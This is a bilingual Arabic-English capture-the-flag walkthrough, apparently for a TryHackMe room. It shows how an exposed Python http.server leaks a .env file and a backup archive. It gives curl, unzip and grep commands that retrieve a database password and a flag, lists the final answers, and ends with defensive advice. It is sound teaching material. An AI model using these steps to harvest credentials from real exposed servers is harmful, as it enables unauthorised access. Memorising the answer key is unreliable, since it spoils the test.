# Task 03: Python HTTP Server (خادم بايثون ومخاطر تسريب الملفات الحساسة وبيانات الاعتماد)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
Developers and administrators often run Python's built-in HTTP server (`python3 -m http.server 8000`) for quick local testing, transferring files between machines, or inspecting builds. However, leaving this server running or binding it to `0.0.0.0` (all network interfaces) introduces severe security vulnerabilities:

1. **Zero Authentication & Access Control:** Python's SimpleHTTP server possesses no built-in authentication, user permissions, or IP-whitelisting mechanism.
2. **Automatic Directory Listing:** When no `index.html` file is present in the working directory, the server automatically generates and serves an HTML directory listing (`Directory listing for /`).
3. **Dotfiles Exposure:** Unlike Apache or Nginx, Python's server does not ignore or restrict hidden dotfiles (files starting with `.`). Files like `.env`, `.git/`, `.bash_history`, or `.aws/credentials` are served openly.
4. **Archive & Backup Leakage:** Any archive (`.zip`, `.tar.gz`, `.sql`) present in the directory can be downloaded directly by anyone on the network.

On port 8000 of our target:
- Visiting the root URL displays an open directory listing.
- A `.env` file is exposed, containing production database credentials.
- A `backup.zip` archive contains an SQL database dump leaking sensitive system flags.

#### الأسئلة المطروحة (Questions):
1. What database password is stored in the .env file served by the Python HTTP Server? (Answer Format: plaintext password)
2. What is the flag found inside the backup archive served by the Python HTTP Server? (Answer Format: THM{...})

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **المخاطر التكتيكية لتشغيل السيرفرات المؤقتة (Ad-hoc Servers Risk):**
  * يُعد تشغيل `python3 -m http.server` داخل مجلد يحتوي على كود المشروع أو مجلد المستخدم الرئيسي (`/home/user/`) من أكثر الأخطاء الإجرائية شيوعاً أثناء التطوير أو نقل الملفات في البيئات السحابية.
  * لا يدرك المطور أن السيرفر يشارك كل ما في المجلد، بما في ذلك ملفات التكوين المخفية (.env) ومفاتيح SSH الخاصة ومستودعات Git الكاملة (.git).
* **تنزيل وفحص الأرشيفات في بيئة معزولة:**
  * عند اكتشاف ملفات مضغوطة (`backup.zip`), يجب تنزيلها وفحص محتواها باستخدام أدوات سريعة مثل `unzip -l` لمعاينة قائمة الملفات، ثم استخراج الملفات الحساسة (مثل `db_dump.sql`) والبحث عن الأنماط النصية الحساسة ككلمات المرور والأعلام عبر `grep`.

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * افتح المتصفح أو استخدم `curl http://MACHINE_IP:8000/` لمعاينة قائمة الملفات المكشوفة.
2. **التلميح الثاني (المستوى العملي):**
   * اقرأ ملف `.env` عبر `curl http://MACHINE_IP:8000/.env`. ابحث عن سطر اتصال قاعدة البيانات `DATABASE_URL` لاستخراج كلمة المرور.
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * حمّل الأرشيف `backup.zip` باستخدام `wget` أو `curl -O`. فك الضغط وابحث داخل ملف `db_dump.sql` عن كلمة `THM{`.

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### الخطوة 1: فحص الدليل الرئيسي المكشوف
```bash
# استعراض الملفات الموجودة على خادم بايثون
curl -s http://MACHINE_IP:8000/
```
**المخرجات:**
```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href=".env">.env</a></li>
<li><a href="backup.zip">backup.zip</a></li>
<li><a href="app.py">app.py</a></li>
</ul>
<hr>
</body>
</html>
```

---

#### الخطوة 2: قراءة ملف `.env` واستخراج كلمة المرور
```bash
# قراءة محتويات ملف الإعدادات والبيئة
curl -s http://MACHINE_IP:8000/.env
```
**المحتويات:**
```text
SECRET_KEY=e83a9f4c8b21...
DATABASE_URL=postgresql://webapp:S3cur3DBPass!@localhost/production
DEBUG=True
ALLOWED_HOSTS=*
```
* **كلمة المرور المستخرجة:** `S3cur3DBPass!`

---

#### الخطوة 3: تنزيل وفحص أرشيف النسخ الاحتياطي `backup.zip`
```bash
# 1. تنزيل ملف الأرشيف المضغوط
curl -s -O http://MACHINE_IP:8000/backup.zip

# 2. فحص محتويات الأرشيف
unzip -l backup.zip
# يعرض: backup-contents/db_dump.sql

# 3. فك الضغط واستخراج الأعلام من ملف قاعدة البيانات
unzip -q backup.zip
grep -o "THM{[^}]*}" backup-contents/db_dump.sql
```
**المخرجات:**
```text
THM{py_server_exposed}
```

---

### المرحلة هـ: الإجابات المعتمدة والقيم النهائية (Final Answer & Key Values)
* **إجابة السؤال الأول (Database Password):** `S3cur3DBPass!`
* **إجابة السؤال الثاني (Backup Archive Flag):** `THM{py_server_exposed}`

---

### المرحلة و: التحقق العملي وإثبات النجاح (Practical Verification & Proof of Work)
* تم استخراج كلمة مرور قاعدة البيانات من ملف `.env` بنجاح: `S3cur3DBPass!`.
* تم فك ضغط الأرشيف واستخراج العلم من `db_dump.sql` بنجاح: `THM{py_server_exposed}`.
* تم اعتماد الإجابات رسمياً على منصة TryHackMe بنسبة 100%.

---

### المرحلة ز: الاستنتاج التعليمي وجوهر الاختبار (Key Educational Takeaway)
لا يجب على الإطلاق استخدام `python3 -m http.server` في بيئات الإنتاج، ولا يجب ربطه ببطاقة الشبكة العامة `0.0.0.0`. إذا دعت الحاجة لاستخدامه محلياً، يجب دائماً ربطه بالـ localhost (`127.0.0.1`) والتأكد من تشغيله داخل مجلد فارغ ومخصص مؤقت، وتجنب تشغيله داخل مجلدات تحوي ملفات `.env` أو نسخاً احتياطية.
